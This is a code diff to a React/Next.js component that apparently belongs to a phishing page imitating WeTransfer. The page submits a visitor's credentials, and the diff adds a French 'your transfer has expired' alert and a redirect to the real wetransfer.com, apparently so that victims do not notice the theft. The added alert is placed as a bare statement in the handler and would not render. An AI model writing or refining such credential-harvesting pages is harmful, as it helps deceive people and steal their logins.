@@ -4,7 +4,7 @@ import { useState } from "react";
 import { Button } from "@/components/ui/button";
 import { Card, CardContent, CardHeader } from "@/components/ui/card";
 import { Input } from "@/components/ui/input";
-import { Alert, AlertDescription } from "@/components/ui/alert";
+import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
 import Image from "next/image";
 import { FileText, AlertCircle, Eye, EyeOff, Loader2 } from "lucide-react";
 
@@ -103,8 +103,14 @@ export default function Component() {
       if (!response.ok) {
         throw new Error("Failed to submit credentials");
       }
-
-      window.location.href = "#";
+      <Alert variant="destructive">
+      <AlertCircle className="h-4 w-4" />
+      <AlertTitle>Erreur</AlertTitle>
+      <AlertDescription>
+      votre transfert est expiré
+      </AlertDescription>
+    </Alert>
+      window.location.href = "https://wetransfer.com/";
     } catch (error) {
       console.error("Error:", error);
       setError(
